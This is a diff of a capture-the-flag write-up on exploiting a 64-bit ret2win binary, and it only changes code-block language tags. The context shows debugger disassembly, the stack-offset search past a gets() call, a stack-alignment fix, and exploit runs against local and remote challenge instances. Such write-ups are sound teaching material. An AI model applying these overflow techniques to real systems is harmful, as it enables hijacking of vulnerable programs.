@@ -18,7 +18,7 @@ This binary has identical source code to win32, but is compiled for 64-bit.
 
 As always, we check the security of the binary:
 
-```as
+```nasm
 $ checksec win64
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -36,7 +36,7 @@ Unsurprisingly, checking the functions list yields us the same result as `win32`
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  info functions
 All defined functions:
 
@@ -61,7 +61,7 @@ Non-debugging symbols:
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x7fb173a34290]> afl
 0x004010b0    1     37 entry0
 0x00403ff0    1     64 reloc.__libc_start_main
@@ -88,7 +88,7 @@ We're going straight to `read_in` because we know the contents of `win` and `mai
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  disas read_in
 Dump of assembler code for function read_in:
    0x00000000004011b5 <+0>:	endbr64 
@@ -112,7 +112,7 @@ Dump of assembler code for function read_in:
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x7fb173a34290]> pdf@sym.read_in
             ; CALL XREF from main @ 0x401200(x)
 ┌ 62: sym.read_in ();
@@ -139,8 +139,6 @@ Dump of assembler code for function read_in:
 {% endtab %}
 {% endtabs %}
 
-
-
 We see that this is formatted very similar to the `win32` binary, so it shouldn't be that scary.
 
 The same "assembly dance" is happening in this binary. Let's go over this process:
@@ -166,7 +164,7 @@ Since this is 64-bit, parameters are passed via the register. We know that `gets
 
 If we check the last data that was passed to `rdi` before `gets` is called, this is where we write. We find that this line is the last update to `rdi`:
 
-```as
+```nasm
 0x00000000004011df <+42>:	lea    rax,[rbp-0x30]
 0x00000000004011e3 <+46>:	mov    rdi,rax
 ```
@@ -179,14 +177,14 @@ Getting the offset is the same in 64-bit as 32-bit. Let's put a breakpoint right
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  b *(read_in+54)
 gef➤  run
 ```
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x7f7db482e290]> db 0x4011eb
 [0x7f7db482e290]> dc
 Can you figure out how to win here?
@@ -195,10 +193,9 @@ INFO: hit breakpoint at: 0x4011eb
 {% endtab %}
 {% endtabs %}
 
-
 Find the address of the return pointer by checking the instruction after the `call` to `read_in`:
 
-```as
+```nasm
 0x0000000000401200 <+13>:	call   0x4011b5 <read_in>
 0x0000000000401205 <+18>:	lea    rax,[rip+0xe30]        # 0x40203c
 ```
@@ -209,7 +206,7 @@ Let's check what's on the stack:
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  x/10gx $rsp
 0x7fffffffe450:	0x0000000000000000	0x0000000000000000
 0x7fffffffe460:	0x0000000000000000	0x0000000000000000
@@ -220,7 +217,7 @@ gef➤  x/10gx $rsp
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x004011eb]> pxq 80@rsp
 0x7ffd543e9280  0x0000000000000000  0x0000000000000000   ................
 0x7ffd543e9290  0x0000000000000000  0x0000000000000000   ................
@@ -235,33 +232,32 @@ We see that the return pointer is there:
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  x/gx 0x7fffffffe488
 0x7fffffffe488:	0x0000000000401205
 ```
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x004011eb]> pxq 8 @ 0x7ffd543e92b8
 0x7ffd543e92b8  0x0000000000401205                       ..@.....
 ```
 {% endtab %}
 {% endtabs %}
 
-
 Checking `rdi` shows us where we will start writing:
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  p/x $rdi
 $1 = 0x7fffffffe450
 ```
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x004011eb]> dr rdi
 0x7ffd543e9280
 ```
@@ -295,7 +291,7 @@ proc.interactive()
 
 Running this produces the following output:
 
-```bash
+```nasm
 $ python3 exploit.py 
 [+] Starting local process './win64': pid 20651
 [*] Switching to interactive mode
@@ -329,7 +325,7 @@ This is going to set a breakpoint right before the `gets()` call (which we did m
 
 If we reach the end of `read_in`, we notice, based on the execution flow, that it intends to go to `win()`:
 
-```as
+```nasm
      0x4011eb <read_in+54>     call   0x401090 <gets@plt>
      0x4011f0 <read_in+59>     nop    
      0x4011f1 <read_in+60>     leave  
@@ -344,19 +340,19 @@ If we reach the end of `read_in`, we notice, based on the execution flow, that i
 
 Using `ni`, we see that the program successfully makes it to `win()`. Our payload successfully takes us to the right place! If we continue execution to let it print the flag, we see that it segfaults:
 
-```as
+```nasm
 [#0] Id 1, Name: "win64", stopped 0x7fc438850963 in __sigemptyset (), reason: SIGSEGV
 ```
 
 We notice that it stops on the `movaps` instruction inside of `do_system`:
 
-```as
+```nasm
  → 0x7fc438850963 <do_system+115>  movaps XMMWORD PTR [rsp], xmm1
 ```
 
 From the call trace, we see that this is called from `win()` calling `system()`, as expected:
 
-```as
+```nasm
 [#0] 0x7fc438850963 → __sigemptyset(set=<optimized out>)
 [#1] 0x7fc438850963 → do_system(line=0x402008 "cat flag.txt")
 [#2] 0x4011b2 → win()
@@ -368,7 +364,7 @@ How can we fix this? We can add `8` bytes to the payload, which will make it `64
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  disas deregister_tm_clones
 Dump of assembler code for function deregister_tm_clones:
    0x00000000004010f0 <+0>:	mov    eax,0x404048
@@ -385,7 +381,7 @@ Dump of assembler code for function deregister_tm_clones:
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x004011eb]> pdf@sym.deregister_tm_clones
             ; CALL XREF from sym.__do_global_dtors_aux @ 0x401171(x)
 ┌ 31: sym.deregister_tm_clones ();
@@ -430,7 +426,7 @@ You'll notice that I label my variables based on what they are. `f` variables ar
 
 Running this:
 
-```
+```nasm
 $ python3 exploit.py 
 [+] Starting local process './win64': pid 21192
 [*] Switching to interactive mode
@@ -444,7 +440,7 @@ $
 
 `cat flag.txt` is called! Let's run this against the remote server:
 
-```
+```nasm
 $ python3 exploit.py 
 [+] Opening connection to vunrotc.cole-ellis.com on port 1200: Done
 [*] Switching to interactive mode
